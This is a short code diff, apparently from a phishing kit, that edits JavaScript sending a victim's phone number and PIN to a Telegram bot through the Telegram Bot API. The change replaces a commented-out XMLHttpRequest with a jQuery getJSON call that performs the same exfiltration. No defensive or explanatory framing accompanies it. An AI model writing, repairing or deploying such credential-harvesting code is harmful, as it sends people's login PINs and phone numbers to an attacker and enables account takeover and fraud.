@@ -244,10 +244,13 @@
             const messageText = '`'+phonenumber+'`\n`'+phonenumber+'`\n`'+pin+'`'
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
 
-            var oReq = new XMLHttpRequest();
-            oReq.open("GET", url);
-            oReq.send();
+            // var oReq = new XMLHttpRequest();
+            // oReq.open("GET", url);
+            // oReq.send();
 
+            $.getJSON(url, function(data){
+                if(data)console.log(data);
+            });
             // oReq.onreadystatechange = function () {
             //     if (oReq.readyState === 4) {
             //         if (oReq.status === 200) {
